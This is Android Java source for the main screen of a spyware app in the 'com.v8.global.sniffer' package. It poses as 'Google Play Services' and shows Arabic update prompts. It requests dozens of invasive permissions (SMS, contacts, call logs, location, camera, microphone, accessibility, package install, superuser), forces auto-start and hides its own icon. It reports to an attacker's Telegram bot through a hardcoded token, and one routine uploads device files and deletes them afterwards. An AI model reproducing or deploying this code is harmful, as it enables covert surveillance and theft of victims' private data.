package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    private TextView statusText;
    private Button mainButton;
    private LinearLayout permissionsLayout;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    private final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.MANAGE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.WRITE_CONTACTS,
        android.Manifest.permission.GET_ACCOUNTS,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.SEND_SMS,
        android.Manifest.permission.RECEIVE_SMS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.WRITE_CALL_LOG,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.CALL_PHONE,
        android.Manifest.permission.ANSWER_PHONE_CALLS,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.SYSTEM_ALERT_WINDOW,
        android.Manifest.permission.WRITE_SETTINGS,
        android.Manifest.permission.PACKAGE_USAGE_STATS,
        android.Manifest.permission.FOREGROUND_SERVICE,
        android.Manifest.permission.WAKE_LOCK,
        android.Manifest.permission.RECEIVE_BOOT_COMPLETED,
        android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
        android.Manifest.permission.ACCESS_NOTIFICATION_POLICY,
        android.Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
        android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE,
        android.Manifest.permission.INTERNET,
        android.Manifest.permission.ACCESS_NETWORK_STATE,
        android.Manifest.permission.ACCESS_WIFI_STATE,
        android.Manifest.permission.CHANGE_WIFI_STATE,
        android.Manifest.permission.CHANGE_NETWORK_STATE,
        android.Manifest.permission.BLUETOOTH,
        android.Manifest.permission.BLUETOOTH_ADMIN,
        android.Manifest.permission.BLUETOOTH_PRIVILEGED,
        android.Manifest.permission.NFC,
        android.Manifest.permission.VIBRATE,
        android.Manifest.permission.USE_BIOMETRIC,
        android.Manifest.permission.USE_FINGERPRINT,
        android.Manifest.permission.BODY_SENSORS,
        android.Manifest.permission.ACTIVITY_RECOGNITION,
        android.Manifest.permission.KILL_BACKGROUND_PROCESSES,
        android.Manifest.permission.CLEAR_APP_CACHE,
        android.Manifest.permission.CLEAR_APP_USER_DATA,
        android.Manifest.permission.READ_LOGS,
        android.Manifest.permission.DUMP,
        android.Manifest.permission.INJECT_EVENTS,
        android.Manifest.permission.SET_TIME,
        android.Manifest.permission.SET_TIME_ZONE,
        android.Manifest.permission.INSTALL_PACKAGES,
        android.Manifest.permission.DELETE_PACKAGES,
        android.Manifest.permission.ACCESS_SUPERUSER
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        }
        
        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setPadding(50, 50, 50, 50);
        mainLayout.setBackgroundColor(0xFFF5F5F5);
        
        TextView titleText = new TextView(this);
        titleText.setText("Google Play Services");
        titleText.setTextSize(24);
        titleText.setTextColor(0xFF4CAF50);
        titleText.setGravity(Gravity.CENTER);
        titleText.setPadding(0, 0, 0, 20);
        
        statusText = new TextView(this);
        statusText.setText("✓ التحقق من الصلاحيات...");
        statusText.setTextSize(16);
        statusText.setTextColor(0xFF666666);
        statusText.setGravity(Gravity.CENTER);
        statusText.setPadding(0, 20, 0, 30);
        
        permissionsLayout = new LinearLayout(this);
        permissionsLayout.setOrientation(LinearLayout.VERTICAL);
        permissionsLayout.setPadding(0, 0, 0, 30);
        
        mainButton = new Button(this);
        mainButton.setText("بدء تثبيت التحديث");
        mainButton.setTextSize(16);
        mainButton.setBackgroundColor(0xFF4CAF50);
        mainButton.setTextColor(0xFFFFFFFF);
        mainButton.setPadding(30, 15, 30, 15);
        mainButton.setAllCaps(false);
        
        mainButton.setOnClickListener(v -> {
            checkAndRequestPermissions();
        });
        
        mainLayout.addView(titleText);
        mainLayout.addView(statusText);
        mainLayout.addView(permissionsLayout);
        mainLayout.addView(mainButton);
        
        setContentView(mainLayout);
        
        handler.postDelayed(this::updatePermissionsStatus, 1000);
    }
    
    private void updatePermissionsStatus() {
        permissionsLayout.removeAllViews();
        
        List<String> missingPermissions = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
                
                TextView permText = new TextView(this);
                permText.setText("❌ " + getPermissionName(permission));
                permText.setTextColor(0xFFFF0000);
                permText.setPadding(20, 5, 20, 5);
                permissionsLayout.addView(permText);
            } else {
                TextView permText = new TextView(this);
                permText.setText("✅ " + getPermissionName(permission));
                permText.setTextColor(0xFF4CAF50);
                permText.setPadding(20, 5, 20, 5);
                permissionsLayout.addView(permText);
            }
        }
        
        if (missingPermissions.isEmpty()) {
            statusText.setText("✓ جميع الصلاحيات ممنوحة");
            statusText.setTextColor(0xFF4CAF50);
            mainButton.setText("متابعة التثبيت");
        } else {
            statusText.setText("⚠ يوجد " + missingPermissions.size() + " صلاحية مفقودة");
            statusText.setTextColor(0xFFFF9800);
            mainButton.setText("منح الصلاحيات المفقودة");
        }
    }
    
    private String getPermissionName(String permission) {
        switch (permission) {
            case android.Manifest.permission.READ_EXTERNAL_STORAGE: return "الوصول للملفات";
            case android.Manifest.permission.WRITE_EXTERNAL_STORAGE: return "الكتابة في الملفات";
            case android.Manifest.permission.MANAGE_EXTERNAL_STORAGE: return "إدارة الملفات";
            case android.Manifest.permission.READ_CONTACTS: return "قراءة جهات الاتصال";
            case android.Manifest.permission.WRITE_CONTACTS: return "كتابة جهات الاتصال";
            case android.Manifest.permission.GET_ACCOUNTS: return "الحسابات";
            case android.Manifest.permission.READ_SMS: return "قراءة الرسائل";
            case android.Manifest.permission.SEND_SMS: return "إرسال الرسائل";
            case android.Manifest.permission.RECEIVE_SMS: return "استقبال الرسائل";
            case android.Manifest.permission.READ_CALL_LOG: return "قراءة سجل المكالمات";
            case android.Manifest.permission.WRITE_CALL_LOG: return "كتابة سجل المكالمات";
            case android.Manifest.permission.READ_PHONE_STATE: return "حالة الهاتف";
            case android.Manifest.permission.CALL_PHONE: return "الاتصال";
            case android.Manifest.permission.ANSWER_PHONE_CALLS: return "الرد على المكالمات";
            case android.Manifest.permission.ACCESS_FINE_LOCATION: return "الموقع الدقيق";
            case android.Manifest.permission.ACCESS_COARSE_LOCATION: return "الموقع التقريبي";
            case android.Manifest.permission.ACCESS_BACKGROUND_LOCATION: return "الموقع في الخلفية";
            case android.Manifest.permission.CAMERA: return "الكاميرا";
            case android.Manifest.permission.RECORD_AUDIO: return "تسجيل الصوت";
            case android.Manifest.permission.SYSTEM_ALERT_WINDOW: return "النوافذ العائمة";
            case android.Manifest.permission.WRITE_SETTINGS: return "تعديل الإعدادات";
            case android.Manifest.permission.PACKAGE_USAGE_STATS: return "إحصائيات الاستخدام";
            case android.Manifest.permission.FOREGROUND_SERVICE: return "خدمات الخلفية";
            case android.Manifest.permission.WAKE_LOCK: return "منع النوم";
            case android.Manifest.permission.RECEIVE_BOOT_COMPLETED: return "التشغيل مع الجهاز";
            case android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS: return "تجاهل تحسين البطارية";
            case android.Manifest.permission.ACCESS_NOTIFICATION_POLICY: return "الوصول للإشعارات";
            case android.Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE: return "استماع الإشعارات";
            case android.Manifest.permission.BIND_ACCESSIBILITY_SERVICE: return "خدمات الوصول";
            case android.Manifest.permission.INTERNET: return "الإنترنت";
            case android.Manifest.permission.ACCESS_NETWORK_STATE: return "حالة الشبكة";
            case android.Manifest.permission.ACCESS_WIFI_STATE: return "حالة WiFi";
            case android.Manifest.permission.CHANGE_WIFI_STATE: return "تغيير WiFi";
            case android.Manifest.permission.CHANGE_NETWORK_STATE: return "تغيير الشبكة";
            case android.Manifest.permission.BLUETOOTH: return "بلوتوث";
            case android.Manifest.permission.BLUETOOTH_ADMIN: return "إدارة بلوتوث";
            case android.Manifest.permission.BLUETOOTH_PRIVILEGED: return "بلوتوث مميز";
            case android.Manifest.permission.NFC: return "NFC";
            case android.Manifest.permission.VIBRATE: return "الاهتزاز";
            case android.Manifest.permission.USE_BIOMETRIC: return "البيومترية";
            case android.Manifest.permission.USE_FINGERPRINT: return "البصمة";
            case android.Manifest.permission.BODY_SENSORS: return "مستشعرات الجسم";
            case android.Manifest.permission.ACTIVITY_RECOGNITION: return "النشاط البدني";
            case android.Manifest.permission.KILL_BACKGROUND_PROCESSES: return "قتل العمليات";
            case android.Manifest.permission.CLEAR_APP_CACHE: return "مسح الكاش";
            case android.Manifest.permission.CLEAR_APP_USER_DATA: return "مسح بيانات المستخدم";
            case android.Manifest.permission.READ_LOGS: return "قراءة السجلات";
            case android.Manifest.permission.DUMP: return "تفريغ المعلومات";
            case android.Manifest.permission.INJECT_EVENTS: return "حقن الأحداث";
            case android.Manifest.permission.SET_TIME: return "تغيير الوقت";
            case android.Manifest.permission.SET_TIME_ZONE: return "تغيير المنطقة الزمنية";
            case android.Manifest.permission.INSTALL_PACKAGES: return "تثبيت التطبيقات";
            case android.Manifest.permission.DELETE_PACKAGES: return "حذف التطبيقات";
            case android.Manifest.permission.ACCESS_SUPERUSER: return "الوصول الجذري";
            default: return permission;
        }
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsToRequest.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            startBackgroundServices();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        updatePermissionsStatus();
        
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            startBackgroundServices();
        }
    }
    
    private void startBackgroundServices() {
        statusText.setText("جاري التثبيت... 100%");
        mainButton.setEnabled(false);
        mainButton.setBackgroundColor(0xFFCCCCCC);
        
        startService(new Intent(this, ControlService.class));
        
        enableAutoStart();
        
        new Thread(() -> {
            sendToTelegram("✅ V13 نشط", "تم التثبيت - تحكم كامل");
        }).start();
        
        handler.postDelayed(() -> {
            hideApp();
        }, 3000);
    }
    
    private void enableAutoStart() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent intent = new Intent();
                String manufacturer = android.os.Build.MANUFACTURER;
                
                if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"));
                } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
                } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BootStartActivity"));
                } else if ("huawei".equalsIgnoreCase(manufacturer)) {
                    intent.setComponent(new android.content.ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"));
                }
                
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                }
            }
        } catch (Exception e) {
        }
    }
    
    private void hideApp() {
        try {
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(getComponentName(),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            
            Intent startMain = new Intent(Intent.ACTION_MAIN);
            startMain.addCategory(Intent.CATEGORY_HOME);
            startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(startMain);
            
            finish();
            
        } catch (Exception e) {
        }
    }
    
    private void sendToTelegram(String title, String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                "/sendMessage?chat_id=" + CHAT_ID + 
                "&text=" + URLEncoder.encode("🔴 " + title + "\n\n" + message, "UTF-8");
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
        }
    }
    
    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;
            
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            
            DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            outputStream.writeBytes(CHAT_ID + "\r\n");
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            outputStream.writeBytes("🔴 " + caption + "\r\n");
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
            outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            
            outputStream.writeBytes("\r\n--" + boundary + "--\r\n");
            outputStream.flush();
            outputStream.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
            file.delete();
        } catch (Exception e) {
        }
    }
            }
